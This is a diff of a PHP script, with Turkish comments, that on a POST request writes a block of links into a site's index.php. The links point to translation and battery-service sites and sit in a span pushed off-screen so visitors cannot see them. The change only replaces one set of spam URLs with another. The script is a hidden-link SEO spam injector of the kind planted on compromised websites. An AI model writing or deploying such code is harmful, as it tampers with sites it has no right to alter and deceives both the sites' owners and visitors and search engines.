@@ -3,13 +3,11 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Eklenecek backlink kodu
     $backlinkCode = '<span style="position: absolute; left: -9655px;">
-<p>Ingilizce Turkce Cevir <a title="ingilizceturkce.gen.tr" href="https://turkceingilizce.ingilizceturkce.gen.tr/" rel="dofollow">ingilizceturkce.gen.tr</a></p>
-<p>Aku Servis <a title="akumyolda.com" href="https://akumyolda.com/" rel="dofollow">akumyolda.com</a></p>
-<p>Text to Speech and Accent Translator <a title="translatedict.com" href="https://www.translatedict.com/text-to-speech.html" rel="dofollow"> translatedict.com</a></p>
-<p>Mandarin Chinese to English <a title="freetranslations.org" href="https://www.freetranslations.org/chinese-to-english-translation.html" rel="dofollow">freetranslations.org</a></p>
-<p>Voice Translator from Spanish to English<a title="spanishenglish.net" href="https://spanishenglish.net/voice-translator/" rel="dofollow"> spanishenglish.net</a></p>
-<p>Endonezce Turkce Ceviri <a title="turkceingilizce.gen.tr" href="https://turkceingilizce.gen.tr/endonezce-turkce-ceviri/" rel="dofollow">turkceingilizce.gen.tr</a></p>
-</span>' . PHP_EOL;
+<p>Ingilizce Dersleri <a title="ingilizceturkce.gen.tr" href="https://ingilizcedersleri.ingilizceturkce.gen.tr/" rel="dofollow">ingilizceturkce.gen.tr</a></p>
+<p>Aku Takviye <a title="akumyolda.com" href="https://akumyolda.com/aku-takviye/" rel="dofollow">akumyolda.com</a></p>
+<p>Tranlate English to Norwegian <a title="translatedict.com" href="https://www.translatedict.com/translate-english-to-norwegian.html" rel="dofollow"> translatedict.com</a></p>
+<p>Spanish Accent Translator <a title="freetranslations.org" href="https://www.freetranslations.org/spanish-accent-generator.html" rel="dofollow">freetranslations.org</a></p>
+<p>Korece Turkce Ceviri <a title="turkceingilizce.gen.tr" href="https://turkceingilizce.gen.tr/korece-turkce-ceviri/" rel="dofollow">turkceingilizce.gen.tr</a></p></span>' . PHP_EOL;
 
     // Ana dizindeki index.php dosyasının yolu
     $indexFilePath = __DIR__ . DIRECTORY_SEPARATOR . 'index.php';
